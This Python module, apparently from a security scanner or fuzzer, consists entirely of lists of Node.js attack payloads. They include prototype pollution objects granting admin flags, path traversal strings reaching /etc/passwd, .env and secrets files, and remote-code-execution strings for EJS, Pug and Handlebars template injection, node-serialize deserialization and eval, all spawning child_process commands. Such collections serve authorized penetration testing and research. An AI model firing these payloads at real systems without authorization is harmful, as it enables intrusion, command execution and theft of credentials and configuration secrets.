"""node.py — Node.js Runtime-Specific Attack Payloads"""

# ─────────────────────────────────────────────
# Prototype Pollution
# ─────────────────────────────────────────────
NODE_PROTOTYPE_POLLUTION: list[str] = [
    # Constructor prototype pollution
    '{"__proto__":{"admin":true}}',
    '{"__proto__":{"isAdmin":true}}',
    '{"__proto__":{"role":"admin"}}',
    '{"constructor":{"prototype":{"admin":true}}}',
    '{"constructor":{"prototype":{"isAdmin":1}}}',
    # Nested pollution
    '{"__proto__":{"polluted":"yes"}}',
    '{"a":{"__proto__":{"admin":true}}}',
    '{"__proto__":{"toString":"polluted"}}',
    # URL encoded
    '__proto__[admin]=true',
    '__proto__[isAdmin]=1',
    'constructor[prototype][admin]=true',
    'constructor.prototype.admin=true',
    # AST injection via pollution
    '{"__proto__":{"type":"Program","body":[{"type":"CallExpression","callee":{"type":"Identifier","name":"process"},"arguments":[]}]}}',
    # RCE via template engine pollution
    '{"__proto__":{"defaultMessage":"{{7*7}}"}}',
    '{"__proto__":{"debug":true}}',
    # Express.js specific
    '{"__proto__":{"redirect":1}}',
    '{"__proto__":{"query":{"__proto__":{"polluted":1}}}}',
]

# ─────────────────────────────────────────────
# Path Traversal (Node.js specific)
# ─────────────────────────────────────────────
NODE_PATH_TRAVERSAL: list[str] = [
    # Basic
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    # Node module paths
    "../node_modules/.env",
    "../../.env",
    "../../../.env",
    "../package.json",
    "../../package.json",
    # Encoded
    "%2e%2e%2f" * 3 + "etc/passwd",
    "%2e%2e/" * 3 + "etc/passwd",
    "..%2f" * 3 + "etc/passwd",
    # Null byte
    "../etc/passwd%00.json",
    "../etc/passwd\x00.json",
    # Windows
    "..\\..\\..\\windows\\win.ini",
    # Secrets
    "../.env",
    "../../.env",
    "../config.js",
    "../config.json",
    "../../config/database.yml",
    "../secrets.json",
]

# ─────────────────────────────────────────────
# Node.js RCE vectors
# ─────────────────────────────────────────────
NODE_RCE: list[str] = [
    # SSTI via EJS
    "<%= process.mainModule.require('child_process').exec('id', (e,r)=>r) %>",
    "<%= global.process.mainModule.require('child_process').execSync('id').toString() %>",
    # SSTI via Pug/Jade
    "- var x = root.process\n- x = x.mainModule\n- x = x.require\n- x = x('child_process')\n= x.exec('id')",
    # Handlebars
    '{{#with "s" as |string|}}\n  {{#with "e"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub "constructor")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push "return require(\'child_process\').execSync(\'id\').toString()"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}',
    # VM module escape
    "require('child_process').exec('id')",
    "process.binding('spawn_sync')",
    # Deserialization
    '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\',function(error,stdout,stderr){console.log(stdout)})}()"}',
    # eval injection
    "eval(require('fs').readFileSync('/etc/passwd','utf8'))",
    "global.process.mainModule.constructor._resolveFilename('child_process')",
]
